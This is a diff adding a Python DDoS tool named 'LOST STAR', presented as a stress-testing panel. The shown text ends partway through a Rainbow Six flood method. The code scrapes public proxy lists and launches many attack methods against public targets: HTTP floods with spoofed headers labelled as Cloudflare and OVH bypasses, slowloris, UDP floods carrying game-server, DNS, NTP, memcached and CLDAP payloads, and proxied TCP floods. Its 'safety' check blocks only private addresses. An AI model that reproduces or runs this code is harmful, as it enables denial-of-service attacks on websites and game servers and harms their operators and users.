@@ -1,0 +1,1159 @@
+#!/usr/bin/env python3
+"""
+LOST STAR — Stress Testing Control Panel v3.0.0
+OWNED BY XRV — THIS MEANS NOT FOR YOU
+"""
+from __future__ import annotations
+import asyncio, socket, random, time, sys, os, threading, ipaddress, inspect, struct
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from typing import List, Dict, Optional, Set, Callable
+import urllib.request
+
+try:
+    import aiohttp
+except ImportError:
+    os.system(f"{sys.executable} -m pip install aiohttp -q")
+    import aiohttp
+
+VERSION = "3.5.0"
+OWNER = "XRV"
+OWNER_MARK = "OWNED BY XRV — LOST STAR"
+_XRV_SEAL = "XRV::LOSTSTAR::SEAL::7f3a9c2e"
+
+PROXY_SOURCES = [
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+]
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+]
+
+class C:
+    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"; W="\033[97m"; D="\033[90m"
+    BOLD="\033[1m"; END="\033[0m"
+    FIRE1="\033[38;5;196m"; FIRE2="\033[38;5;202m"; FIRE3="\033[38;5;208m"; FIRE4="\033[38;5;214m"
+    NEON="\033[38;5;51m"; ASH="\033[38;5;240m"; STEEL="\033[38;5;250m"; BLOOD="\033[38;5;124m"
+
+def clear():
+    os.system("cls" if os.name=="nt" else "clear")
+
+BANNER = f"""
+{C.W}{C.BOLD}
+            @@@@@@@@@@@@@@@@#%
+           +%%@@@@@@@@@@@@@@@==.                                                                      +@@@@@                                                  @###
+               @@@@@@@@@=:    ===                                                                   @@@@@@@@                                               *@#####
+              %@@@@@@@#@==.    *==-                                                                 @@@@@@@@                                              --######+
+              @@@@@@@@#%====     ===                @@@@@@@@@##                 @@@@@@@@##          @@@@@@@#                                @@#@         ---%######
+             %@@@@@@@#@=======    *==          *@@@@@@@@@@@@@@@@@#.         @@@@@@@@@@@@@@@@@#  -@@@@@@@@@@@@@@@####@.                 @############## .-%##################      %@###########.     .@@######+ =@#######
+             @@@@@@@@#@========     =        @@@@@@@@=-  :-@@@@@@@@#.     %@@@@@@%+   .=@@@@@@+  %%%@@@@@@@@%%%%@#@=+                %#####@*  :-@#####. =%%%######%%@@###@    .@######%%%@######.--:-%@@######@##########
+            @@@@@@@@#@===========          @@@@@@@#%*-.    .%@@@@@@@#%   -@@@@@@@#+    ..@@@@=+..   @@@@@@@#      --+               +@######    ..=###...  .-@######     *    *@######   .:=######--    :=########@-.:####
+            @@@@@@@@#%===========        :@@@@@@@#%**+-.    .@@@@@@@@#:  .%@@@@@@@@#@   :::-***..   %@@@@@@#      -+:              -:%########=.:::--*..  ---%######+       -:.%#@@%*+ .::--%######  .::--%######@ .::.%##
+           @@@@@@@@#@===========+       :@@@@@@@@@=***+-:    %@@@@@@@#%    %@@@@@@@@@@@@#   +** .   %@@@@@@#.    .-+               ::..%###########  .   ---:-####### .   -:::.      .:*%@@########+::---:-@#####:::::::++
+          :@@@@@@@@#@===========        @@@@@@@@#@==***++:   %@@@@@@@#==     .%@@@@@@@@@@@@#+** .   %@@@@@##.    :-.              ::..  .+%###########= ------%######   .-:::     +@########@%######-------%######:::.
+          @@@@@@@@#@===========*       .@@@@@@@@#%===***++:  @@@@@@@@@===  .    .:%@@@@@@@@@@#+     %@@@@###.    -               -:..       :-%#########%----:%######@ -:::     -@######%:  :+######%-----:-@######
+         *@@@@@@@@#@===========   @##% .@@@@@@@@#@=====**   =@@@@@@@#=*==@@@#*      .%@@@@@@@@@     %@@@####                     ::. +###:       %#######*---:+#######:::     --%####### :---:%######------:*######
+         @@@@@@@@#@============ :@@@#@==%@@@@@@@@#%=====    @@@@@@@%=***+@@@@@        .@@@@@@@@     %@@#####@      @@             . --####*      ..@######-----%######@    :@#--%#######----+@#######@-----:-%######
+        %@@@@@@@@#@============@@@@@@===.@@@@@@@@@#%====  %@@@@@@@%*+***%@@@@@#       +@@@@@@#=     %@###############@             ---######*  .::*######%---:::###############%:%########################--:-#######
+      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@***=+%@@@@@@@@@@@@@@@@@@@@@=+++++**%@@@@@@@@@@@@@@@@@@@@**.    .%############@=-.            ---:%################@%--::::. @##########@+::. %###########@.%#######@--%#############+
+   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@=*****= =%@@@@@@@@@@@@@@==+:---++++*.=%@@@@@@@@@@@@@@@=+-+*=    : +@######@@=- ...            --:: :-%%@#######@@%*.--:::::.. .%@##@@%* :::... ..%%@@@@%*::. -%@@=:---:+++++++++++++++
+  ++++++++++++++++++++-------------=********=  :--+=%%+**+.    .:---++++     ::--+++++     :-++*    :.   :-- .     ..             -::                .  :::::..          .:::..           .::.      ----:
+                                     ********                   .::--++                    .:++     :.            ...             ::                    .::..           ::...           ::..     ----.
+                                       *****+                    .::-                       :-      ..                            :               .      ...             ..          ::..      ---
+                                         ***
+{C.END}
+{C.ASH}  · ★ ·  *  ·   ★    ·  *  ·   ★  ·  *  ·{C.END}
+{C.ASH}  ╔════════════════════════════════════════════════════╗
+  ║{C.NEON} ★ LOST STAR · STRESS ENGINE v{VERSION} ★            {C.ASH}║
+  ║{C.STEEL}   proxy-routed · multi-vector · starlit              {C.ASH}║
+  ║{C.FIRE1}{C.BOLD}   OWNED BY XRV — LOST STAR                           {C.ASH}║
+  ╚════════════════════════════════════════════════════╝{C.END}
+"""
+
+def loading_screen():
+    clear()
+    glyphs = ["·", "*", "★", "✦", ".", "✧", "⋆"]
+    width, height, phases = 72, 18, 12
+    for phase in range(phases):
+        clear()
+        rows = []
+        for r in range(height):
+            line = []
+            for c in range(width):
+                dens = 0.07 + phase * 0.018
+                if abs(r - height // 2) < 4 and abs(c - width // 2) < 16:
+                    dens += 0.12
+                line.append(random.choice(glyphs) if random.random() < dens else " ")
+            rows.append("".join(line))
+        print(C.ASH + chr(10).join(rows) + C.END)
+        print()
+        print(f"{C.W}{C.BOLD}                 ★ aligning lost star ★{C.END}")
+        print(f"{C.NEON}                 {'★'*(phase+1)}{'·'*(phases-phase-1)}{C.END}")
+        time.sleep(0.12)
+    clear()
+    print(BANNER)
+    print()
+    steps = [
+        "charting constellations", "igniting core", "binding threads",
+        "locking safety", "harvesting proxies", "loading L7", "loading L4",
+        "loading games", "opening L6", "soft area", "starfield online"
+    ]
+    for i, name in enumerate(steps):
+        pct = int((i+1)/len(steps)*100)
+        bar = "★"*(i+1) + "·"*(len(steps)-i-1)
+        sys.stdout.write(f"\r  {C.NEON}✦{C.END} {C.STEEL}{name:<24}{C.END} [{C.FIRE2}{bar}{C.END}] {pct:3d}%")
+        sys.stdout.flush(); time.sleep(0.11)
+    print()
+    print(f"\n  {C.G}{C.BOLD}★ LOST STAR {VERSION} ONLINE ★{C.END}\n")
+    time.sleep(0.35)
+
+# ── SAFETY ─────────────────────────────────────────────
+class SafetyGuard:
+    PRIVATE=[ipaddress.ip_network(n) for n in [
+        "0.0.0.0/8","10.0.0.0/8","100.64.0.0/10","127.0.0.0/8","169.254.0.0/16",
+        "172.16.0.0/12","192.168.0.0/16","224.0.0.0/4","240.0.0.0/4"]]
+    SOFT_MAX_PPS=2500; SOFT_MAX_HTTP=200; SOFT_MAX_TCP=150; SOFT_MAX_SLOW=200; SOFT_MAX_UDP_TH=40
+    def __init__(self):
+        self.local_ips:Set[str]=set(); self.gateway_ips:Set[str]=set(); self.soft_mode=True
+        self._detect()
+    def _detect(self):
+        self.local_ips.add("127.0.0.1"); lan=None
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
+            lan=s.getsockname()[0]; self.local_ips.add(lan); s.close()
+        except Exception: pass
+        try: self.local_ips.add(socket.gethostbyname(socket.gethostname()))
+        except Exception: pass
+        self.gateway_ips.update({"192.168.0.1","192.168.1.1","192.168.1.254","10.0.0.1"})
+        if lan and not lan.startswith("127."):
+            parts=lan.split(".")
+            if len(parts)==4:
+                self.gateway_ips.add(".".join(parts[:3]+["1"]))
+                self.gateway_ips.add(".".join(parts[:3]+["254"]))
+    def is_safe(self, target:str)->bool:
+        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0].strip().lower()
+        if host in ("localhost","0.0.0.0") or host in self.local_ips or host in self.gateway_ips: return False
+        try:
+            ip=ipaddress.ip_address(host)
+            if str(ip) in self.local_ips or str(ip) in self.gateway_ips: return False
+            return not any(ip in n for n in self.PRIVATE)
+        except ValueError:
+            try:
+                resolved=socket.gethostbyname(host)
+                if resolved in self.local_ips or resolved in self.gateway_ips: return False
+                ip=ipaddress.ip_address(resolved)
+                return not any(ip in n for n in self.PRIVATE)
+            except Exception: return True
+    def cap_pps(self,n): return max(1,min(n,self.SOFT_MAX_PPS)) if self.soft_mode else max(1,n)
+    def cap_http(self,n): return max(1,min(n,self.SOFT_MAX_HTTP)) if self.soft_mode else max(1,n)
+    def cap_tcp(self,n): return max(1,min(n,self.SOFT_MAX_TCP)) if self.soft_mode else max(1,n)
+    def cap_slow(self,n): return max(1,min(n,self.SOFT_MAX_SLOW)) if self.soft_mode else max(1,n)
+
+# ── PROXY ──────────────────────────────────────────────
+class ProxyPool:
+    def __init__(self):
+        self.proxies:List[str]=[]; self.working:List[str]=[]; self.lock=threading.Lock()
+    def _pull(self,url:str)->Set[str]:
+        got:Set[str]=set()
+        try:
+            req=urllib.request.Request(url,headers={"User-Agent":random.choice(USER_AGENTS)})
+            with urllib.request.urlopen(req,timeout=4) as r:
+                for line in r.read().decode("utf-8","ignore").splitlines():
+                    line=line.strip()
+                    if ":" in line and not line.startswith("#"):
+                        a,b=line.split(":",1)
+                        if b.isdigit() and 1<=int(b)<=65535: got.add(line)
+        except Exception: pass
+        return got
+    def _probe(self,proxy:str)->bool:
+        try:
+            h,p=proxy.split(":"); s=socket.socket(); s.settimeout(2.0); s.connect((h,int(p))); s.close(); return True
+        except Exception: return False
+    def fetch(self)->int:
+        print(f"{C.Y}[*] Fetching proxies...{C.END}"); found:Set[str]=set()
+        with ThreadPoolExecutor(max_workers=6) as ex:
+            futs={ex.submit(self._pull,u):u for u in PROXY_SOURCES}
+            for i,fut in enumerate(as_completed(futs,timeout=20),1):
+                u=futs[fut]; short=u.split("/")[2] if "://" in u else u[:28]
+                try:
+                    c=fut.result(); found.update(c)
+                    print(f"  {C.G}✓{C.END} {short:<28} +{len(c):,}")
+                except Exception:
+                    print(f"  {C.R}✗{C.END} {short:<28} fail")
+        with self.lock: self.proxies=list(found); self.working=[]
+        print(f"{C.G}[+] Loaded {len(self.proxies):,}{C.END}")
+        if self.proxies: self.validate(80)
+        return len(self.proxies)
+    def validate(self,sample=80)->int:
+        with self.lock: cands=list(self.proxies)
+        random.shuffle(cands); sample_list=cands[:min(sample,len(cands))]
+        print(f"{C.Y}[*] Probing {len(sample_list)}...{C.END}"); live=[]
+        with ThreadPoolExecutor(max_workers=40) as ex:
+            futs={ex.submit(self._probe,p):p for p in sample_list}
+            for fut in as_completed(futs,timeout=25):
+                try:
+                    if fut.result(): live.append(futs[fut])
+                except Exception: pass
+        with self.lock:
+            self.working=live
+            if live: self.proxies=live+[x for x in self.proxies if x not in live]
+        print(f"{C.G}[+] {len(live)} live{C.END}"); return len(live)
+    def get(self)->Optional[str]:
+        with self.lock:
+            if self.working and random.random()<0.85: return random.choice(self.working)
+            return random.choice(self.proxies) if self.proxies else None
+    def mark_good(self,p):
+        with self.lock:
+            if p not in self.working: self.working.append(p)
+            if len(self.working)>500: self.working=self.working[-400:]
+    def mark_bad(self,p):
+        with self.lock:
+            if p in self.working:
+                try: self.working.remove(p)
+                except ValueError: pass
+
+def parse_host_port(target: str, default_port: int = 80):
+    """Accept IP, hostname, domain (.net/.com/...), URL, or host:port."""
+    s = target.strip()
+    s = s.replace("http://", "").replace("https://", "")
+    s = s.split("/")[0].split("?")[0].strip()
+    host, port = s, default_port
+    if s.startswith("[") and "]" in s:
+        # [ipv6]:port
+        bracket, rest = s[1:].split("]", 1)
+        host = bracket
+        if rest.startswith(":") and rest[1:].isdigit():
+            port = int(rest[1:])
+    elif s.count(":") == 1:
+        h, p = s.rsplit(":", 1)
+        if p.isdigit():
+            host, port = h, int(p)
+    return host, port
+
+def resolve_target(target: str):
+    host, _ = parse_host_port(target, 0)
+    try:
+        ip = socket.gethostbyname(host)
+    except Exception:
+        ip = host
+    label = host if len(host) <= 28 else host[:25] + "..."
+    return ip, label
+
+def resolve_mc_target(target: str):
+    """Minecraft: accept play.example.net, example.com:25565, raw IP."""
+    host, port = parse_host_port(target, 25565)
+    if port == 0:
+        port = 25565
+    try:
+        ip = socket.gethostbyname(host)
+    except Exception:
+        ip = host
+    return ip, host, port
+
+# ── METHODS ────────────────────────────────────────────
+class Methods:
+    def __init__(self, pool:ProxyPool, safety:SafetyGuard):
+        self.pool=pool; self.safety=safety; self.running=False
+        self.stats={"sent":0,"success":0,"fail":0,"start":0,"method":""}
+        self.recent:List[str]=[]; self.target_label=("",""); self._lock=threading.Lock()
+    def _inc(self,k,n=1):
+        with self._lock: self.stats[k]+=n
+    def stop(self): self.running=False
+
+    # L7 HTTP family
+    async def _http_generic(self, target, duration, concurrency, mode:str):
+        if not self.safety.is_safe(target):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        url = target if target.startswith("http") else f"http://{target}"
+        self.running=True
+        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":f"L7-{mode.upper()}"}
+        end=time.time()+duration
+        conc=self.safety.cap_http(concurrency)
+        connector=aiohttp.TCPConnector(limit=0,ssl=False,ttl_dns_cache=60,enable_cleanup_closed=True)
+        timeout=aiohttp.ClientTimeout(total=8,connect=3,sock_read=5)
+        fail_streak={}
+
+        def headers_for(m):
+            h={"Accept":"*/*","Accept-Language":"en-US,en;q=0.9","Cache-Control":"no-cache","Connection":"keep-alive"}
+            if m=="null":
+                h["User-Agent"]=""; h["Accept"]=""; h["Accept-Language"]=""
+            elif m=="bot":
+                h["User-Agent"]="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+            elif m=="cookie":
+                h["User-Agent"]=random.choice(USER_AGENTS)
+                h["Cookie"]=f"session={random.randbytes(16).hex()}; id={random.randint(1,999999)}"
+            elif m in ("cfb","cfbuam","bypass","ovh","dgb","avb","gsb","stomp"):
+                h["User-Agent"]=random.choice(USER_AGENTS)
+                h["Referer"]=f"https://www.google.com/search?q={random.randint(1000,9999)}"
+                h["X-Forwarded-For"]=f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+                h["X-Real-IP"]=h["X-Forwarded-For"]
+                if m=="cfbuam": h["CF-Connecting-IP"]=h["X-Forwarded-For"]
+            elif m=="even":
+                h["User-Agent"]=random.choice(USER_AGENTS)
+                h["Accept-Encoding"]="gzip, deflate, br"; h["Upgrade-Insecure-Requests"]="1"
+            else:
+                h["User-Agent"]=random.choice(USER_AGENTS)
+            return h
+
+        def url_for(m, base):
+            if m=="dyn":
+                sub=f"{random.randbytes(4).hex()}"
+                if "://" in base:
+                    scheme,rest=base.split("://",1); host=rest.split("/")[0]
+                    return f"{scheme}://{sub}.{host}/"
+                return f"http://{sub}.{base}/"
+            if m=="xmlrpc":
+                return base.rstrip("/")+"/xmlrpc.php"
+            if m=="rhex":
+                return base.rstrip("/")+"/"+random.randbytes(8).hex()
+            return base
+
+        async with aiohttp.ClientSession(connector=connector,timeout=timeout) as session:
+            async def worker():
+                while self.running and time.time()<end:
+                    proxy=self.pool.get()
+                    hdrs=headers_for(mode)
+                    u=url_for(mode,url)
+                    try:
+                        kw={"headers":hdrs,"allow_redirects":True}
+                        if proxy: kw["proxy"]=f"http://{proxy}"
+                        if mode in ("post","stress","apache"):
+                            body=random.randbytes(random.randint(64,2048) if mode=="stress" else 64)
+                            async with session.post(u,data=body,**kw) as resp:
+                                try: await resp.content.read(512)
+                                except Exception: pass
+                        elif mode=="head":
+                            async with session.head(u,**kw) as resp:
+                                pass
+                        elif mode=="downloader":
+                            async with session.get(u,**kw) as resp:
+                                async for _ in resp.content.iter_chunked(64):
+                                    await asyncio.sleep(0.05)
+                        else:
+                            async with session.get(u,**kw) as resp:
+                                try: await resp.content.read(1024)
+                                except Exception: pass
+                        self._inc("sent"); self._inc("success")
+                        if proxy: self.pool.mark_good(proxy); fail_streak[proxy]=0
+                    except Exception:
+                        self._inc("sent"); self._inc("fail")
+                        if proxy:
+                            fail_streak[proxy]=fail_streak.get(proxy,0)+1
+                            if fail_streak[proxy]>=3: self.pool.mark_bad(proxy)
+                    await asyncio.sleep(0)
+            tasks=[asyncio.create_task(worker()) for _ in range(conc)]
+            try: await asyncio.gather(*tasks, return_exceptions=True)
+            finally:
+                for t in tasks:
+                    if not t.done(): t.cancel()
+                await connector.close()
+        self.running=False
+
+    async def http_get(self,t,d,c): await self._http_generic(t,d,c,"get")
+    async def http_post(self,t,d,c): await self._http_generic(t,d,c,"post")
+    async def http_head(self,t,d,c): await self._http_generic(t,d,c,"head")
+    async def http_null(self,t,d,c): await self._http_generic(t,d,c,"null")
+    async def http_cookie(self,t,d,c): await self._http_generic(t,d,c,"cookie")
+    async def http_pps(self,t,d,c): await self._http_generic(t,d,c,"pps")
+    async def http_even(self,t,d,c): await self._http_generic(t,d,c,"even")
+    async def http_bot(self,t,d,c): await self._http_generic(t,d,c,"bot")
+    async def http_stress(self,t,d,c): await self._http_generic(t,d,c,"stress")
+    async def http_dyn(self,t,d,c): await self._http_generic(t,d,c,"dyn")
+    async def http_rhex(self,t,d,c): await self._http_generic(t,d,c,"rhex")
+    async def http_stomp(self,t,d,c): await self._http_generic(t,d,c,"stomp")
+    async def http_ovh(self,t,d,c): await self._http_generic(t,d,c,"ovh")
+    async def http_gsb(self,t,d,c): await self._http_generic(t,d,c,"gsb")
+    async def http_dgb(self,t,d,c): await self._http_generic(t,d,c,"dgb")
+    async def http_avb(self,t,d,c): await self._http_generic(t,d,c,"avb")
+    async def http_cfb(self,t,d,c): await self._http_generic(t,d,c,"cfb")
+    async def http_cfbuam(self,t,d,c): await self._http_generic(t,d,c,"cfbuam")
+    async def http_bypass(self,t,d,c): await self._http_generic(t,d,c,"bypass")
+    async def http_apache(self,t,d,c): await self._http_generic(t,d,c,"apache")
+    async def http_xmlrpc(self,t,d,c): await self._http_generic(t,d,c,"xmlrpc")
+    async def http_downloader(self,t,d,c): await self._http_generic(t,d,c,"downloader")
+
+    def slowloris(self, target, duration, sockets_n):
+        if not self.safety.is_safe(target):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
+        port=80
+        if ":" in host:
+            host,ps=host.rsplit(":",1)
+            try: port=int(ps)
+            except Exception: port=80
+        sockets_n=self.safety.cap_slow(sockets_n)
+        self.running=True
+        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":"SLOWLORIS"}
+        end=time.time()+duration; socks=[]
+        def make():
+            try:
+                s=socket.socket(); s.settimeout(4); s.connect((host,port))
+                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
+                s.send(b"User-Agent: Mozilla/5.0\r\nAccept-Language: en-US\r\n"); return s
+            except Exception: return None
+        for _ in range(sockets_n):
+            s=make()
+            if s: socks.append(s); self._inc("success")
+            self._inc("sent")
+        while self.running and time.time()<end:
+            for s in list(socks):
+                try: s.send(f"X-a: {random.randint(1,9999)}\r\n".encode()); self._inc("sent")
+                except Exception:
+                    try: socks.remove(s)
+                    except ValueError: pass
+                    ns=make()
+                    if ns: socks.append(ns)
+            time.sleep(8)
+        for s in socks:
+            try: s.close()
+            except Exception: pass
+        self.running=False
+
+    # L4 UDP / TCP / special
+    def _udp_blast(self, host, port, duration, pps, tag, payload_fn):
+        if not self.safety.is_safe(host):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        pps = self.safety.cap_pps(pps)
+        self.running = True
+        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": tag}
+        end = time.time() + duration
+        # few threads, big batches — avoids 90k time.sleep calls lagging the PC
+        if self.safety.soft_mode:
+            th_n = min(self.safety.SOFT_MAX_UDP_TH, 16)
+        else:
+            th_n = min(32, max(4, pps // 5000))
+        batch = max(32, min(512, pps // max(th_n, 1)))
+        target_addr = (host, port)
+        sent_box = [0]
+        ok_box = [0]
+        fail_box = [0]
+        lock = threading.Lock()
+
+        def worker():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
+            except Exception:
+                pass
+            local_sent = local_ok = local_fail = 0
+            # prebuild a few payloads so we are not always in random
+            cache = [payload_fn() for _ in range(8)]
+            ci = 0
+            while self.running and time.time() < end:
+                try:
+                    for _ in range(batch):
+                        sock.sendto(cache[ci], target_addr)
+                        ci = (ci + 1) & 7
+                        local_sent += 1
+                        local_ok += 1
+                    # tiny yield only when soft; hard mode spins
+                    if self.safety.soft_mode:
+                        time.sleep(0.0005)
+                except Exception:
+                    local_fail += 1
+                    local_sent += 1
+                if local_sent >= 2000:
+                    with lock:
+                        sent_box[0] += local_sent
+                        ok_box[0] += local_ok
+                        fail_box[0] += local_fail
+                    local_sent = local_ok = local_fail = 0
+                    self.stats["sent"] = sent_box[0]
+                    self.stats["success"] = ok_box[0]
+                    self.stats["fail"] = fail_box[0]
+            with lock:
+                sent_box[0] += local_sent
+                ok_box[0] += local_ok
+                fail_box[0] += local_fail
+                self.stats["sent"] = sent_box[0]
+                self.stats["success"] = ok_box[0]
+                self.stats["fail"] = fail_box[0]
+            sock.close()
+
+        ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, th_n))]
+        for th in ths:
+            th.start()
+        for th in ths:
+            th.join(timeout=duration + 3)
+        self.running = False
+
+    def udp_flood(self, target, port, duration, pps, mode="std"):
+        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
+        def payload():
+            if mode=="jumbo": return random.randbytes(1200)
+            if mode=="ovh": return random.randbytes(random.randint(128,1024))
+            if mode=="vse": return b"\xff\xff\xff\xffTSource Engine Query\x00"+random.randbytes(4)
+            if mode=="ts3": return b"TS3A\x00"+random.randbytes(32)
+            if mode=="fivem": return b"getinfo "+random.randbytes(4)
+            if mode=="fivemtoken": return b"getstatus "+random.randbytes(8)
+            if mode=="fivemplayers": return b"getplayers "
+            if mode=="minecraft": return random.randbytes(32)
+            if mode=="mcpe":
+                magic=bytes.fromhex("00ffff00fefefefefdfdfdfd12345678")
+                return b"\x01"+random.randbytes(8)+magic+random.randbytes(8)
+            if mode=="rust": return b"\xff\xff\xff\xff"+b"TSource Engine Query\x00"+random.randbytes(6)
+            if mode=="gmod": return b"\xff\xff\xff\xffTSource Engine Query\x00"
+            if mode=="ark": return b"\xff\xff\xff\xff"+b"getstatus"+random.randbytes(4)
+            if mode=="samp":
+                return b"SAMP"+b"\x00\x00\x00\x00"+port.to_bytes(2,"little")+b"i"+random.randbytes(4)
+            if mode=="csgo": return b"\xff\xff\xff\xffTSource Engine Query\x00"+random.randbytes(2)
+            if mode=="discord": return b"\x80\x78"+random.randbytes(10)+random.randbytes(80)
+            if mode=="dns":
+                return random.randbytes(2)+b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
+            if mode=="ntp": return b"\x1b"+random.randbytes(47)
+            if mode=="char": return bytes(range(32,127))*2
+            if mode=="mem": return b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n"
+            if mode=="cldap": return b"\x30\x84\x00\x00\x00\x2d"+random.randbytes(20)
+            if mode=="ard": return b"\x00\x14\x00\x00"+random.randbytes(16)
+            if mode=="rdp": return b"\x00\x00\x00\x00\x00\x00\x00\xff"+random.randbytes(8)
+            return random.randbytes(512)
+        self._udp_blast(host,port,duration,pps,f"UDP-{mode.upper()}",payload)
+
+    def _tcp_connect(self, host, port, timeout=3.0, via_proxy=True):
+        """Connect direct or through HTTP CONNECT proxy so traffic leaves via proxy (saves home WiFi)."""
+        proxy = self.pool.get() if via_proxy else None
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        if proxy:
+            ph, pp = proxy.split(":")
+            s.connect((ph, int(pp)))
+            req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\nProxy-Connection: keep-alive\r\n\r\n"
+            s.sendall(req.encode())
+            resp = b""
+            while b"\r\n\r\n" not in resp and len(resp) < 1024:
+                chunk = s.recv(256)
+                if not chunk:
+                    break
+                resp += chunk
+            if b"200" not in resp.split(b"\r\n", 1)[0]:
+                s.close()
+                raise OSError("proxy CONNECT failed")
+            return s, proxy
+        s.connect((host, port))
+        return s, None
+
+    def tcp_flood(self, target, port, duration, concurrency, mode="connect"):
+        if not self.safety.is_safe(target):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+        concurrency = self.safety.cap_tcp(concurrency)
+        self.running = True
+        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": f"TCP-{mode.upper()}"}
+        end = time.time() + duration
+        use_proxy = len(self.pool.proxies) > 0
+
+        def varint(n):
+            out = bytearray()
+            while True:
+                b = n & 0x7F
+                n >>= 7
+                out.append(b | (0x80 if n else 0))
+                if not n:
+                    break
+            return bytes(out)
+
+        def worker():
+            while self.running and time.time() < end:
+                s = None
+                proxy = None
+                try:
+                    s, proxy = self._tcp_connect(host, port, timeout=4.0, via_proxy=use_proxy)
+                    hb = host.encode()
+                    if mode in ("http", "vps"):
+                        path = b"/" if mode == "http" else b"/login"
+                        s.sendall(b"GET " + path + b" HTTP/1.1\r\nHost: " + hb + b"\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
+                        try:
+                            s.recv(512)
+                        except Exception:
+                            pass
+                    elif mode == "rdp":
+                        # RDP connection request (X.224 / TPKT shape) — real handshake bytes
+                        # TPKT + X.224 Connection Request + RDP Negotiation Request
+                        cookie = b"Cookie: mstshash=Admin\r\n"
+                        x224 = b"\xe0\x00\x00\x00\x00\x00" + cookie + b"\x01\x00\x08\x00\x03\x00\x00\x00"
+                        tpkt = b"\x03\x00" + struct.pack(">H", 4 + len(x224)) + x224
+                        s.sendall(tpkt)
+                        try:
+                            s.recv(256)
+                        except Exception:
+                            pass
+                    elif mode == "ssh":
+                        # banner grab / exchange shape
+                        try:
+                            banner = s.recv(256)
+                        except Exception:
+                            banner = b""
+                        s.sendall(b"SSH-2.0-LOSTSTAR_OpenSSH_8.0\r\n")
+                        try:
+                            s.recv(256)
+                        except Exception:
+                            pass
+                    elif mode == "syn_shape" or mode == "cps":
+                        pass  # connect + close
+                    elif mode == "connection":
+                        time.sleep(0.25)
+                    elif mode in ("mcbot", "minecraft"):
+                        h = hb
+                        data = varint(0x00) + varint(760) + varint(len(h)) + h + port.to_bytes(2, "big") + varint(1)
+                        pkt = varint(len(data)) + data + varint(1) + varint(0x00)
+                        s.sendall(pkt)
+                        try:
+                            s.recv(512)
+                        except Exception:
+                            pass
+                    elif mode == "null":
+                        s.sendall(b"\x00" * 128)
+                    elif mode == "junk":
+                        s.sendall(random.randbytes(256))
+                    elif mode == "tls":
+                        # bare ClientHello-ish noise after TCP (not full TLS stack)
+                        s.sendall(b"\x16\x03\x01" + random.randbytes(64))
+                        try:
+                            s.recv(256)
+                        except Exception:
+                            pass
+                    if s:
+                        s.close()
+                    self._inc("sent")
+                    self._inc("success")
+                    if proxy:
+                        self.pool.mark_good(proxy)
+                except Exception:
+                    self._inc("sent")
+                    self._inc("fail")
+                    if proxy:
+                        self.pool.mark_bad(proxy)
+                    if s:
+                        try:
+                            s.close()
+                        except Exception:
+                            pass
+                time.sleep(0.001)
+
+        ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, concurrency))]
+        for t in ths:
+            t.start()
+        for t in ths:
+            t.join(timeout=duration + 2)
+        self.running = False
+
+
+
+    def r6_flood(self, target, port, duration, concurrency, match_id: str):
+        """Rainbow Six Siege-shaped session traffic keyed by match id (TCP, proxied)."""
+        if not self.safety.is_safe(target):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        host = parse_host_port(target, port)[0]
+        concurrency = self.safety.cap_tcp(concurrency)
+        self.running = True
+        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": "R6-SIEGE"}
+        end = time.time() + duration
